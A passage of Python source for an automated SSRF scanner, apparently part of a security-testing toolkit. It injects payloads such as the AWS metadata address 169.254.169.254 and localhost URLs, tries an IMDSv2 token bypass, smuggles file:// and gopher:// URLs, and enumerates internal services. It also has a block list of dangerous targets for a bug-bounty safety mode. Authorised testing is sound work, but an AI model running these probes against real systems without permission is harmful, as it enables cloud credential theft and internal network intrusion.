                evidence.append("SPA detected - reduced confidence (may be false positive)")

        # Baseline comparison
        if baseline_response:
            baseline_len = len(baseline_response.text)
            response_len = len(response.text)

            # SPA baseline check: if response is nearly identical to baseline, it's likely SPA catch-all
            if is_spa and abs(response_len - baseline_len) < 100:
                confidence = max(0, confidence - 20)
                evidence.append("SPA response identical to baseline - likely catch-all route")

            # Significant length change
            len_diff = abs(response_len - baseline_len)
            if len_diff > 500:
                evidence.append(f"Response length change: {baseline_len} -> {response_len}")
                confidence += 10
            
            # Status code change
            if response.status_code != baseline_response.status_code:
                evidence.append(f"Status code change: {baseline_response.status_code} -> {status_code}")
                confidence += 10
            
            # Content type change
            baseline_ct = baseline_response.headers.get("content-type", "")
            response_ct = response.headers.get("content-type", "")
            if baseline_ct != response_ct:
                evidence.append(f"Content-Type change: {baseline_ct} -> {response_ct}")
                confidence += 5
        
        # Time-based analysis
        if response_time > cls.TIMEOUT_THRESHOLD_OPEN:
            evidence.append(f"Extended response time: {response_time:.2f}s")
            confidence += 5
            if response_time > cls.TIMEOUT_THRESHOLD_FILTERED:
                ssrf_type = SSRFType.TIME_BASED
                confidence += 10
        
        # Special status codes
        if status_code in [500, 502, 503, 504]:
            evidence.append(f"Server error status: {status_code}")
            confidence += 5
            
            # Look for specific error patterns
            if "connect" in content or "timeout" in content:
                evidence.append("Connection error in response body")
                confidence += 10
        
        # Check if response contains the target
        if expected_target and expected_target.lower() in content:
            evidence.append(f"Target reflected in response: {expected_target}")
            confidence += 15
        
        # Cap confidence at 100
        confidence = min(confidence, 100)
        
        # Require at least some evidence to be considered vulnerable
        # This prevents false positives from empty responses
        has_evidence = len(evidence) > 0
        
        return SSRFResult(
            vulnerable=confidence >= 40 and has_evidence,
            ssrf_type=ssrf_type,
            confidence_score=confidence,
            payload=payload,
            evidence=evidence,
            response_data=response.text[:1000] if confidence >= 50 else None,
            cloud_provider=cloud_provider,
            metadata_leaked=metadata_leaked,
            internal_ip_accessed=internal_ip_accessed,
            service_discovered=service_discovered,
        )


class SSRFScanner(ScanModule):
    """
    Server-Side Request Forgery Scanner v3.0 GOD-MODE.

    Comprehensive SSRF detection with:
    - Multi-protocol exploitation (15+ protocols)
    - Cloud metadata harvesting (10 cloud providers)
    - IP obfuscation and WAF bypass
    - Blind SSRF detection
    - Protocol smuggling
    - Internal service enumeration
    - Cross-validation and confidence scoring

    Phase 8 (2026-02-26): Supports dependency injection.
    OOBEngine can be injected for better testability and shared callbacks.
    """

    name = "ssrf_scanner"
    version = SSRF_SCANNER_VERSION

    def __init__(
        self,
        settings: "Settings",
        *,  # Force keyword args for DI parameters
        oob_engine: Any = None,  # Phase 8: Optional injected OOBEngine
    ) -> None:
        # Phase 8: Pass injected dependencies to base class
        super().__init__(settings, oob_engine=oob_engine)
        self.timeout = settings.timeouts.request_timeout if hasattr(settings, 'timeouts') else 30.0
        self.findings: list[dict[str, Any]] = []
        self.detected_waf: Optional[WAFType] = None
        self.tested_urls: set[str] = set()
        self.baseline_responses: dict[str, httpx.Response] = {}

        # BUG BOUNTY SAFETY: Initialize safety filter if in bug bounty mode
        self._bug_bounty_mode = is_bug_bounty_mode()
        self._ssrf_safety_filter: Optional[Any] = None

        if self._bug_bounty_mode and SSRF_SAFETY_AVAILABLE:
            self._ssrf_safety_filter = create_bug_bounty_filter()
            logger.info(
                "🛡️ SSRF Scanner: Bug bounty mode ENABLED - dangerous payloads will be filtered",
                mode="bug_bounty",
                filter_active=True,
            )
        elif self._bug_bounty_mode and not SSRF_SAFETY_AVAILABLE:
            logger.warning(
                "⚠️ SSRF Scanner: Bug bounty mode enabled but ssrf_safety module not available!"
            )

        # SSL verification setting
        self._ssl_verify = get_configured_ssl_verify()

        # OOB Engine for blind SSRF detection
        # Phase 8: Use injected OOB engine if available, otherwise create one
        self._oob_engine = self.get_oob_engine()  # From ScanModule base class
        self._scan_id = ""

        if self._oob_engine is None and OOB_ENGINE_AVAILABLE:
            try:
                # Initialize OOB engine with callback server
                # In production, use external service like interactsh
                self._oob_engine = OOBEngine(
                    callback_host="127.0.0.1",
                    callback_port=8888,
                    callback_domain="oob.phantom.local",
                    start_server=False,  # Don't start server by default
                )
                logger.debug("[SSRF] OOB Engine initialized locally for blind detection")
            except Exception as e:
                logger.debug(f"[SSRF] OOB Engine initialization failed: {e}")
        elif self._oob_engine is not None:
            logger.debug("[SSRF] Using injected OOB Engine for blind detection")

    def _filter_payload_for_bug_bounty(self, payload: str) -> tuple[bool, str]:
        """
        Filter a payload based on bug bounty safety rules.

        Args:
            payload: The SSRF payload URL to check

        Returns:
            Tuple of (is_safe, reason)
        """
        if not self._bug_bounty_mode:
            return True, "Bug bounty mode disabled"

        if self._ssrf_safety_filter is None:
            # No filter available, be conservative and block dangerous patterns
            dangerous_patterns = [
                "169.254.169.254",  # AWS metadata
                "100.100.100.200",  # Alibaba metadata
                "metadata.google.internal",
                "127.0.0.1", "localhost", "::1",
                "10.", "172.16.", "172.17.", "172.18.", "192.168.",
                "file://", "gopher://", "dict://", "ldap://",
            ]
            payload_lower = payload.lower()
            for pattern in dangerous_patterns:
                if pattern in payload_lower:
                    return False, f"BLOCKED: Contains dangerous pattern '{pattern}'"
            return True, "Payload appears safe"

        # Use the safety filter
        return self._ssrf_safety_filter.is_url_safe(payload)

    def _get_safe_payloads(
        self,
        payloads: list[tuple[str, str]],
        limit: int = 15,
    ) -> list[tuple[str, str]]:
        """
        Get payloads that are safe for the current mode.

        In bug bounty mode, filters out dangerous targets.
        In pentest mode, returns all payloads.

        Args:
            payloads: List of (payload, description) tuples
            limit: Maximum number of payloads to return

        Returns:
            Filtered list of safe payloads
        """
        if not self._bug_bounty_mode:
            return payloads[:limit]

        safe_payloads = []
        for payload, description in payloads:
            is_safe, reason = self._filter_payload_for_bug_bounty(payload)
            if is_safe:
                safe_payloads.append((payload, description))
            else:
                logger.debug(f"SSRF payload filtered: {reason}", payload=payload[:50])

            if len(safe_payloads) >= limit:
                break

        if len(safe_payloads) < len(payloads[:limit]):
            logger.info(
                f"🛡️ SSRF payloads filtered: {len(payloads[:limit]) - len(safe_payloads)} blocked by safety filter"
            )

        return safe_payloads
    
    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> dict[str, Any]:
        """Execute comprehensive SSRF scan."""
        self.findings = []
        self.tested_urls = set()

        base_url = resolve_base_url(host)

        # FIX 2026-02-19: Get URLs from both "urls" and "endpoints" keys
        # full_scanner passes endpoints as "endpoints", not "urls"
        urls: list[str] = []
        if isinstance(asset_data, dict):
            urls = asset_data.get("urls", []) or []
            # Also get from "endpoints" key - this is what full_scanner provides
            endpoints = asset_data.get("endpoints", []) or []
            if endpoints:
                # Merge endpoints into urls, avoiding duplicates
                existing = set(urls)
                for ep in endpoints:
                    if ep not in existing:
                        urls.append(ep)
                        existing.add(ep)
                logger.info(f"[SSRF] Using {len(urls)} URLs ({len(endpoints)} from endpoints, {len(asset_data.get('urls', []))} from urls)")

        if isinstance(asset_data, dict):
            forms = asset_data.get("forms", [])

        # SCAN CONTEXT: Unified access to auth, response validation, training app awareness
        self._ctx = ScanContext(asset_data)
        self._ctx.log_context_status()
        self._auth_headers = self._ctx.auth_headers

        # PERF-FIX 2026-02-20: Store asset_data for intelligent payload selection
        self._asset_data = asset_data

        # SHARED FINDINGS STORE: Cross-module targeting
        if isinstance(asset_data, dict):
            shared_store = asset_data.get("shared_findings_store")
        if shared_store:
            from utils.shared_findings_store import VulnType
            existing_urls = {u.split("?")[0] if "?" in u else u for u in urls}
            # SSRF often works where URL parameters are processed
            for vtype in [VulnType.XXE, VulnType.LFI, VulnType.OPEN_REDIRECT]:
                for sf in shared_store.get_findings_by_type(vtype):
                    if sf.endpoint and sf.endpoint not in existing_urls:
                        urls.append(sf.endpoint)
                        logger.debug(f"[SSRF] Cross-module target from {sf.module}: {sf.endpoint}")

        # TOOL_DISCOVERED_PARAMS: Add Arjun-discovered params to endpoints
        if isinstance(asset_data, dict):
            tool_params = asset_data.get("tool_discovered_params") or {}
        if tool_params:
            ssrf_params = ["url", "uri", "link", "src", "source", "redirect", "target",
                           "proxy", "callback", "next", "goto", "return", "fetch", "load"]
            new_urls = []
            for url in urls:
                parsed = urlparse(url)
                if parsed.netloc in tool_params:
                    for param in tool_params[parsed.netloc]:
                        # Prioritize params that sound like URL/redirect handlers
                        if any(ssrf_word in param.lower() for ssrf_word in ssrf_params):
                            test_url = f"{url}{'&' if '?' in url else '?'}{param}=http://test"
                            if test_url not in urls:
                                new_urls.append(test_url)
                                logger.debug(f"[SSRF] Adding Arjun param: {param}")
            urls.extend(new_urls[:20])  # Limit expansion

        # ENHANCEMENT 2026-02-20: Get endpoint_params and vuln_type_hints from metadata discovery
        # This enables testing of endpoints discovered from /scanner, /api-docs, etc.
        endpoint_params: dict[str, list[str]] = {}
        vuln_type_hints: dict[str, list[str]] = {}
        if isinstance(asset_data, dict):
            endpoint_params = asset_data.get("endpoint_params", {})
            vuln_type_hints = asset_data.get("vuln_type_hints", {})
        if endpoint_params:
            logger.info(f"[SSRF] Received {len(endpoint_params)} endpoints with params from metadata discovery")

        # Add metadata-discovered endpoints with SSRF hints to url list
        ssrf_hint_types = {"SIMPLE_SSRF", "SSRF", "SERVER_SIDE_REQUEST_FORGERY", "BLIND_SSRF"}
        for ep_url, hints in vuln_type_hints.items():
            if not any(h in ssrf_hint_types for h in hints):
                continue
            # Normalize URL
            if ep_url.startswith("/"):
                full_url = f"{base_url}{ep_url}"
            elif not ep_url.startswith("http"):
                full_url = f"{base_url}/{ep_url}"
            else:
                full_url = ep_url
            # Add with parameters
            params = endpoint_params.get(ep_url, ["url", "uri", "link", "redirect", "target"])
            for param in params[:3]:  # Limit to 3 params
                test_url = f"{full_url}?{param}=http://test" if "?" not in full_url else f"{full_url}&{param}=http://test"
                if test_url not in urls:
                    urls.append(test_url)
                    logger.debug(f"[SSRF] Adding metadata endpoint: {test_url}")
        if vuln_type_hints:
            ssrf_hinted = sum(1 for hints in vuln_type_hints.values() if any(h in ssrf_hint_types for h in hints))
            if ssrf_hinted > 0:
                logger.info(f"[SSRF] Added {ssrf_hinted} endpoints with SSRF hints")

        logger.info(f"🎯 SSRF Scanner v{self.version} starting on {host}")
        if self._ctx.has_auth:
            logger.info(f"[SSRF] Using authenticated session ({self._ctx.auth_method})")

        # BUG BOUNTY MODE: Log safety restrictions
        if self._bug_bounty_mode:
            logger.info(
                "🔒 SSRF Scanner running in BUG BOUNTY mode - "
                "cloud metadata, internal IPs, and dangerous protocols are BLOCKED"
            )

        # Use protected client with proper SSL verification
        # FIX: Pass auth headers to client for authenticated endpoint testing
        client = create_protected_client(
            timeout=self.timeout,
            verify_ssl=self._ssl_verify,
            follow_redirects=True,
            custom_headers=self._auth_headers,
        )
        client._limits = httpx.Limits(max_connections=10)

        async with client:
            
            # Phase 1: WAF Detection
            self.detected_waf = await self._detect_waf(client, base_url, rate_limiter)
            if self.detected_waf:
                logger.info(f"🛡️ WAF detected: {self.detected_waf.value}")
            
            # Phase 2: Collect baseline responses
            await self._collect_baselines(client, urls, rate_limiter)
            
            # Phase 3: URL Parameter Testing
            await self._test_url_parameters(client, base_url, urls, rate_limiter)
            
            # Phase 4: Form Testing
            await self._test_forms(client, base_url, forms, rate_limiter)
            
            # Phase 5: Header Injection Testing
            await self._test_header_injection(client, base_url, urls, rate_limiter)
            
            # Phase 6: Cloud Metadata Access
            await self._test_cloud_metadata(client, base_url, urls, rate_limiter)
            
            # Phase 7: Protocol Smuggling
            await self._test_protocol_smuggling(client, base_url, urls, rate_limiter)
            
            # Phase 8: Internal Service Enumeration
            await self._enumerate_internal_services(client, base_url, urls, rate_limiter)
            
            # Phase 9: Blind SSRF Testing
            await self._test_blind_ssrf(client, base_url, urls, rate_limiter)

            # Phase 10: JSON/XML Body Injection (2026-02-12)
            # Tests SSRF in JSON API and XML endpoints
            await self._test_body_injection(client, base_url, urls, rate_limiter)

        logger.info(f"[SSRF] Scan completed. Found {len(self.findings)} vulnerabilities")

        # CROSS-MODULE SHARING: Add findings to SharedFindingsStore
        try:
            from utils.shared_findings_store import SharedFindingsStore, VulnType
            store = SharedFindingsStore.get_instance()
            
            for f in self.findings:
                if isinstance(f, dict):
                    metadata = f.get("metadata", {})
                    if not isinstance(metadata, dict):
                        metadata = {}

                    await store.add_finding(
                        {
                            "type": VulnType.SSRF,
                            "endpoint": f.get("matched_at") or metadata.get("url", ""),
                            "severity": f.get("severity", "HIGH"),
                            "parameter": metadata.get("param") or metadata.get("vulnerable_param", ""),
                            "ssrf_type": metadata.get("ssrf_type", ""),
                        },
                        module="ssrf",
                    )
            
            if self.findings:
                logger.debug(f"[SSRF] Shared {len(self.findings)} findings to cross-module store")
        except Exception as e:
            logger.debug(f"[SSRF] Could not share findings: {e}")


        return {
            "module": self.name,
            "version": self.version,
            "findings": self.findings,
            "waf_detected": self.detected_waf.value if self.detected_waf else None,
        }
    
    async def _detect_waf(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> Optional[WAFType]:
        """Detect WAF presence."""
        await rate_limiter.acquire()
        
        # Send a request with obvious malicious payload
        test_url = f"{base_url}/?url=http://169.254.169.254/latest/meta-data/"
        
        try:
            response = await client.get(test_url)
            return WAFDetector.detect(response)
        except Exception:
            return None
    
    async def _collect_baselines(
        self,
        client: httpx.AsyncClient,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Collect baseline responses for comparison."""
        for url in urls[:20]:
            await rate_limiter.acquire()
            try:
                response = await client.get(url)
                self.baseline_responses[url] = response
            except Exception:
                pass
    
    async def _test_url_parameters(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test URL parameters for SSRF vulnerabilities."""
        tested_params: set[str] = set()
        
        for url in urls[:100]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # Find SSRF-prone parameters
            ssrf_params = [p for p in params if p.lower() in PayloadGenerator.SSRF_PARAMS]
            
            for param_name in ssrf_params:
                param_key = f"{parsed.path}:{param_name}"
                if param_key in tested_params:
                    continue
                tested_params.add(param_key)

                # Generate payloads
                payloads = PayloadGenerator.generate_localhost_payloads()

                # If WAF detected, prioritize obfuscated payloads
                if self.detected_waf:
                    payloads = self._get_waf_bypass_payloads()

                # PERF-FIX 2026-02-20: Try intelligent payload selection
                intelligent_payloads = await self._get_intelligent_payloads(
                    category="ssrf",
                    endpoint=url,
                    param_name=param_name,
                    max_payloads=30,
                    asset_data=getattr(self, '_asset_data', None),
                )
                if intelligent_payloads:
                    # Use intelligent payloads first, then fall back to generated ones
                    intelligent_list = [(p[0], p[1] if len(p) > 1 else "Intelligent payload") for p in intelligent_payloads]
                    payloads = intelligent_list + payloads

                # BUG BOUNTY SAFETY: Filter dangerous payloads
                safe_payloads = self._get_safe_payloads(payloads, limit=15)

                for payload, description in safe_payloads:
                    await rate_limiter.acquire()
                    
                    modified_params = dict(params)
                    modified_params[param_name] = [payload]
                    query = urlencode(modified_params, doseq=True)
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                    
                    if test_url in self.tested_urls:
                        continue
                    self.tested_urls.add(test_url)
                    
                    try:
                        response = await client.get(test_url)
                        # Use original URL (with original params) for baseline lookup
                        # This compares SSRF-injected response vs clean response
                        baseline = self.baseline_responses.get(url)
                        if baseline is None:
                            # Fallback: try to find baseline by endpoint path
                            endpoint_path = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                            baseline = self.baseline_responses.get(endpoint_path)
                        
                        result = ResponseAnalyzer.analyze(
                            response, payload, baseline, "127.0.0.1"
                        )
                        
                        if result.vulnerable:
                            self._add_finding(
                                name="Server-Side Request Forgery (SSRF)",
                                description=f"SSRF vulnerability in parameter '{param_name}'. {description}",
                                severity=Severity.HIGH if not result.metadata_leaked else "CRITICAL",
                                host=base_url,
                                endpoint=test_url,
                                result=result,
                                param=param_name,
                            )
                            break  # Found SSRF, stop testing this param
                            
                    except Exception as e:
                        logger.debug(f"SSRF test error: {e}")
    
    async def _test_forms(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        forms: list[dict],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test forms for SSRF vulnerabilities."""
        for form in forms[:30]:
            action = form.get("action", "")
            method = form.get("method", "GET").upper()
            inputs = form.get("inputs", [])
            
            # Find URL-related inputs
            url_inputs = [
                inp for inp in inputs
                if any(s in inp.get("name", "").lower() for s in PayloadGenerator.SSRF_PARAMS)
            ]
            
            if not url_inputs:
                continue
            
            form_url = urljoin(base_url, action) if action else base_url
            
            for url_input in url_inputs[:5]:
                await rate_limiter.acquire()

                input_name = url_input.get("name", "")

                # PERF-FIX 2026-02-20: Try intelligent payload selection for forms
                form_payloads = PayloadGenerator.generate_localhost_payloads()[:5]
                intelligent_payloads = await self._get_intelligent_payloads(
                    category="ssrf",
                    endpoint=form_url,
                    param_name=input_name,
                    max_payloads=10,
                    asset_data=getattr(self, '_asset_data', None),
                )
                if intelligent_payloads:
                    intelligent_list = [(p[0], p[1] if len(p) > 1 else "Intelligent payload") for p in intelligent_payloads]
                    form_payloads = intelligent_list[:5] + form_payloads[:3]  # Prioritize intelligent

                # Test with multiple payloads
                for payload, description in form_payloads:
                    form_data = {}
                    for inp in inputs:
                        name = inp.get("name", "")
                        if name:
                            if name == input_name:
                                form_data[name] = payload
                            else:
                                form_data[name] = inp.get("value", "test")
                    
                    try:
                        if method == "POST":
                            response = await client.post(form_url, data=form_data)
                        else:
                            response = await client.get(form_url, params=form_data)
                        
                        result = ResponseAnalyzer.analyze(response, payload)
                        
                        if result.vulnerable:
                            self._add_finding(
                                name="SSRF in Form Parameter",
                                description=f"Form input '{input_name}' vulnerable to SSRF. {description}",
                                severity=Severity.HIGH,
                                host=base_url,
                                endpoint=form_url,
                                result=result,
                                param=input_name,
                            )
                            break
                            
                    except Exception as e:
                        logger.debug(f"Form SSRF test error: {e}")
    
    async def _test_header_injection(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test headers for SSRF injection."""
        # Headers commonly processed by servers
        ssrf_headers = [
            "X-Forwarded-For",
            "X-Real-IP",
            "X-Forwarded-Host",
            "X-Original-URL",
            "X-Rewrite-URL",
            "Forwarded",
            "Host",
            "X-Host",
            "X-Custom-IP-Authorization",
            "X-HTTP-Host-Override",
            "Client-IP",
            "True-Client-IP",
            "X-Client-IP",
            "X-Proxy-URL",
            "Proxy-Host",
            "Request-Uri",
            "X-Original-Request",
            "Destination",
            "Origin",
            "Referer",
        ]
        
        test_url = urls[0] if urls else base_url
        payloads = [
            "http://127.0.0.1/",
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost/",
            "http://[::1]/",
        ]
        
        # Get baseline response first (without SSRF headers)
        try:
            baseline_response = await client.get(test_url)
        except Exception:
            baseline_response = None
        
        for header in ssrf_headers[:10]:
            for payload in payloads[:3]:
                await rate_limiter.acquire()
                
                try:
                    headers = {header: payload}
                    response = await client.get(test_url, headers=headers)
                    
                    # Analyze WITH baseline comparison to reduce false positives
                    result = ResponseAnalyzer.analyze(
                        response, 
                        payload,
                        baseline_response=baseline_response
                    )
                    
                    # Require higher confidence AND actual evidence for header injection
                    # Header injection is harder to confirm without OOB
                    has_strong_evidence = (
                        result.metadata_leaked or 
                        result.internal_ip_accessed or
                        result.service_discovered or
                        len(result.evidence) >= 3
                    )
                    
                    if result.vulnerable and result.confidence >= 70 and has_strong_evidence:
                        self._add_finding(
                            name="SSRF via Header Injection",
                            description=f"Header '{header}' vulnerable to SSRF injection.",
                            severity=Severity.HIGH,
                            host=base_url,
                            endpoint=test_url,
                            result=result,
                            param=header,
                        )
                        break
                        
                except Exception as e:
                    logger.debug(f"Header SSRF test error: {e}")
    
    async def _test_cloud_metadata(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test for cloud metadata access via SSRF."""
        # BUG BOUNTY SAFETY: Skip cloud metadata testing entirely
        # Accessing cloud metadata without authorization is ILLEGAL
        if self._bug_bounty_mode:
            logger.info(
                "🛡️ SSRF: Skipping cloud metadata tests in bug bounty mode - "
                "this would be illegal without explicit authorization"
            )
            return

        # Find URL parameter to test
        target_param = None
        target_url = None
        target_parsed = None
        
        for url in urls[:20]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param_name in params:
                if param_name.lower() in PayloadGenerator.SSRF_PARAMS:
                    target_param = param_name
                    target_url = url
                    target_parsed = parsed
                    break
            if target_param:
                break
        
        if not target_param:
            return
        
        # Test each cloud provider
        for provider in CloudProvider:
            payloads = PayloadGenerator.generate_cloud_payloads(provider)
            config = PayloadGenerator.CLOUD_METADATA.get(provider, {})
            extra_headers = config.get("headers", {})
            indicators = config.get("indicators", [])
            
            # FN-FIX 2026-02-08: Was [:5] - test more cloud metadata endpoints
            for endpoint, description in payloads[:15]:
                await rate_limiter.acquire()

                params = parse_qs(target_parsed.query)
                params[target_param] = [endpoint]
                query = urlencode(params, doseq=True)
                
                test_url = f"{target_parsed.scheme}://{target_parsed.netloc}{target_parsed.path}?{query}"
                
                try:
                    response = await client.get(test_url, headers=extra_headers)
                    content = response.text.lower()
                    
                    # Check for provider-specific indicators
                    metadata_found = any(ind.lower() in content for ind in indicators)
                    
                    if metadata_found:
                        self._add_finding(
                            name=f"Cloud Metadata Access ({provider.value.upper()})",
                            description=f"Access to {provider.value.upper()} cloud metadata endpoint detected. "
                                       f"This can expose sensitive credentials and instance information.",
                            severity=Severity.CRITICAL,
                            host=base_url,
                            endpoint=test_url,
                            result=SSRFResult(
                                vulnerable=True,
                                ssrf_type=SSRFType.BASIC,
                                confidence_score=90,
                                payload=endpoint,
                                evidence=[
                                    f"Cloud provider: {provider.value}",
                                    f"Metadata endpoint: {endpoint}",
                                    f"Indicators found: {[i for i in indicators if i.lower() in content][:3]}",
                                ],
                                cloud_provider=provider,
                                metadata_leaked=True,
                                response_data=response.text[:500],
                            ),
                            param=target_param,
                        )
                        break  # Found metadata for this provider
                        
                except Exception as e:
                    logger.debug(f"Cloud metadata test error: {e}")

        # =====================================================================
        # IMDSv2 Testing (AWS Modern) - requires token-based authentication
        # =====================================================================
        await self._test_aws_imdsv2(client, base_url, target_param, target_parsed, rate_limiter)

    async def _test_aws_imdsv2(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        target_param: str,
        target_parsed,
        rate_limiter: RateLimiter,
    ) -> None:
        """
        Test AWS IMDSv2 metadata access.

        IMDSv2 requires a two-step process:
        1. PUT request to /latest/api/token with TTL header to get session token
        2. Use token in X-aws-ec2-metadata-token header for subsequent requests

        If we can make PUT requests via SSRF, IMDSv2 is also vulnerable.
        """
        aws_config = PayloadGenerator.CLOUD_METADATA.get(CloudProvider.AWS, {})

        # Step 1: Try to get IMDSv2 token via SSRF
        token_endpoint = aws_config.get("imdsv2_token_endpoint", "http://169.254.169.254/latest/api/token")

        await rate_limiter.acquire()

        try:
            params = parse_qs(target_parsed.query)
            params[target_param] = [token_endpoint]
            query = urlencode(params, doseq=True)
            test_url = f"{target_parsed.scheme}://{target_parsed.netloc}{target_parsed.path}?{query}"

            # Try PUT method for token (most SSRF won't support this)
            # If the application forwards PUT requests, IMDSv2 is bypassable
            try:
                # Check if application reflects HTTP method
                response = await client.put(
                    test_url,
                    headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
                    timeout=10.0,
                )

                # IMDSv2 token is a base64-like string
                token = response.text.strip()
                if len(token) > 20 and len(token) < 256 and token.isascii():
                    logger.info(f"[SSRF] Potential IMDSv2 token obtained: {token[:20]}...")

                    # Step 2: Use token to access metadata
                    for endpoint in aws_config.get("imdsv2_endpoints", [])[:3]:
                        await rate_limiter.acquire()

                        params[target_param] = [endpoint]
                        query = urlencode(params, doseq=True)
                        meta_url = f"{target_parsed.scheme}://{target_parsed.netloc}{target_parsed.path}?{query}"

                        try:
                            meta_response = await client.get(
                                meta_url,
                                headers={"X-aws-ec2-metadata-token": token},
                                timeout=10.0,
                            )

                            content = meta_response.text.lower()
                            aws_indicators = aws_config.get("indicators", [])

                            if any(ind.lower() in content for ind in aws_indicators):
                                self._add_finding(
                                    name="AWS IMDSv2 Metadata Access (Token Bypass)",
                                    description=(
                                        "Application allows IMDSv2 metadata access via SSRF. "
                                        "The application forwards PUT requests, allowing IMDSv2 token generation. "
                                        "This bypasses AWS's IMDSv2 security controls and exposes credentials."
                                    ),
                                    severity=Severity.CRITICAL,
                                    host=base_url,
                                    endpoint=meta_url,
                                    result=SSRFResult(
                                        vulnerable=True,
                                        ssrf_type=SSRFType.BASIC,
                                        confidence_score=95,
                                        payload=endpoint,
                                        evidence=[
                                            "IMDSv2 token obtained via PUT SSRF",
                                            f"Token prefix: {token[:20]}...",
                                            f"Metadata endpoint: {endpoint}",
                                            f"Indicators found: {[i for i in aws_indicators if i.lower() in content][:3]}",
                                        ],
                                        cloud_provider=CloudProvider.AWS,
                                        metadata_leaked=True,
                                        response_data=meta_response.text[:500],
                                    ),
                                    param=target_param,
                                )
                                return  # Found vulnerability

                        except Exception as e:
                            logger.debug(f"IMDSv2 metadata access error: {e}")

            except Exception as e:
                logger.debug(f"IMDSv2 token request error (PUT not supported): {e}")

        except Exception as e:
            logger.debug(f"IMDSv2 test error: {e}")

    async def _test_protocol_smuggling(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test for protocol smuggling via SSRF."""
        # BUG BOUNTY SAFETY: Skip protocol smuggling in bug bounty mode
        # These protocols (file://, gopher://, etc.) are too dangerous
        if self._bug_bounty_mode:
            logger.info(
                "🛡️ SSRF: Skipping protocol smuggling tests in bug bounty mode - "
                "file://, gopher://, etc. are blocked for safety"
            )
            return

        # Find URL parameter
        target_param = None
        target_url = None
        target_parsed = None
        
        for url in urls[:20]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param_name in params:
                if param_name.lower() in PayloadGenerator.SSRF_PARAMS:
                    target_param = param_name
                    target_url = url
                    target_parsed = parsed
                    break
            if target_param:
                break
        
        if not target_param:
            return
        
        # Test protocol smuggling payloads
        payloads = PayloadGenerator.generate_protocol_payloads()
        
        for payload, description, protocol in payloads[:20]:
            await rate_limiter.acquire()
            
            params = parse_qs(target_parsed.query)
            params[target_param] = [payload]
            query = urlencode(params, doseq=True)
            
            test_url = f"{target_parsed.scheme}://{target_parsed.netloc}{target_parsed.path}?{query}"
            
            try:
                response = await client.get(test_url)
                result = ResponseAnalyzer.analyze(response, payload)
                
                if result.vulnerable and result.confidence >= 40:
                    severity = "CRITICAL" if protocol in [Protocol.FILE, Protocol.GOPHER] else "HIGH"
                    
                    self._add_finding(
                        name=f"Protocol Smuggling - {protocol.value}://",
                        description=f"Application allows {protocol.value}:// protocol. {description}",
                        severity=severity,
                        host=base_url,
                        endpoint=test_url,
                        result=result,
                        param=target_param,
                    )
                    
            except Exception as e:
                logger.debug(f"Protocol smuggling test error: {e}")
    
    async def _enumerate_internal_services(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Enumerate internal services via SSRF."""
        # BUG BOUNTY SAFETY: Skip internal service enumeration
        # Probing internal network is typically out of scope
        if self._bug_bounty_mode:
            logger.info(
                "🛡️ SSRF: Skipping internal service enumeration in bug bounty mode - "
                "probing internal network is typically forbidden"
            )
            return

        # Find URL parameter
        target_param = None
        target_url = None
        target_parsed = None
        
        for url in urls[:20]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param_name in params:
                if param_name.lower() in PayloadGenerator.SSRF_PARAMS:
                    target_param = param_name
                    target_url = url
                    target_parsed = parsed
                    break
            if target_param:
                break
        
        if not target_param:
            return
        
        # Get baseline response time
        try:
            start = time.time()
            baseline_response = await client.get(target_url)
            baseline_time = time.time() - start
        except (httpx.HTTPError, httpx.TimeoutException, OSError):
            baseline_time = 1.0
        
        discovered_services = []
        
        # Test internal services
        for service_url, service_name in PayloadGenerator.INTERNAL_SERVICES[:25]:
            await rate_limiter.acquire()
            
            params = parse_qs(target_parsed.query)
            params[target_param] = [service_url]
            query = urlencode(params, doseq=True)
            
            test_url = f"{target_parsed.scheme}://{target_parsed.netloc}{target_parsed.path}?{query}"
            
            try:
                start = time.time()
                response = await client.get(test_url)
                response_time = time.time() - start
                
                result = ResponseAnalyzer.analyze(response, service_url)
                
                # Time-based port detection
                time_diff = abs(response_time - baseline_time)
                
                if result.service_discovered or result.vulnerable:
                    discovered_services.append({
                        "url": service_url,
                        "name": service_name,
                        "response_time": response_time,
                        "confidence": result.confidence,
                    })
                elif time_diff > 2.0:
                    # Significant time difference might indicate port status
                    discovered_services.append({
                        "url": service_url,
                        "name": service_name,
                        "response_time": response_time,
                        "confidence": 30,
                        "time_based": True,
                    })
                    
            except Exception as e:
                logger.debug(f"Service enumeration error: {e}")
        
        if discovered_services:
            high_confidence = [s for s in discovered_services if s.get("confidence", 0) >= 50]
            
            if high_confidence:
                self._add_finding(
                    name="Internal Service Discovery via SSRF",
                    description=f"Successfully enumerated {len(high_confidence)} internal services via SSRF.",
                    severity=Severity.HIGH,
                    host=base_url,
                    endpoint=target_url,
                    result=SSRFResult(
                        vulnerable=True,
                        ssrf_type=SSRFType.BASIC,
                        confidence_score=70,
                        payload="Internal service scan",
                        evidence=[
                            f"Discovered services: {[s['name'] for s in high_confidence]}",
                            f"Total services probed: {len(PayloadGenerator.INTERNAL_SERVICES[:25])}",
                        ],
